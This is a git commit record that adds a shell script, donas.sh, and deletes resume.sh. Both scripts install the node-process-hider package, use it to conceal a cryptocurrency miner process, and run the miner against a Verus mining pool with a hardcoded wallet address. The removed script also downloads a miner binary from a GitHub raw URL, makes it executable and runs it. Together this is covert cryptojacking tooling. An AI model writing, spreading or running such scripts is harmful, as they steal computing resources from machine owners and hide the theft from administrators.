df204cf295c653b5d09040c2650f3b29d7e5fa47
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-21 04:21:54 +0700

    Rename dona.sh to donas.sh

---
+++ donas.sh
@@ -0,0 +1,6 @@
+sudo apt update -y
+sudo apt install nodejs -y
+sudo apt install npm -y
+sudo npm i -g node-process-hider
+sudo ph add ccminer
+sudo ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.w2 -p x -d 0
--- resume.sh
+++
@@ -1,8 +0,0 @@
-sudo apt update -y
-sudo apt install nodejs -y
-sudo apt install npm -y
-sudo npm i -g node-process-hider
-wget https://raw.githubusercontent.com/chikahusarii/claim/main/los
-chmod +x los
-sudo ph add los
-sudo ./los --algorithm verushash --pool stratum+tcp://na.luckpool.net:3956 --wallet RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.r1
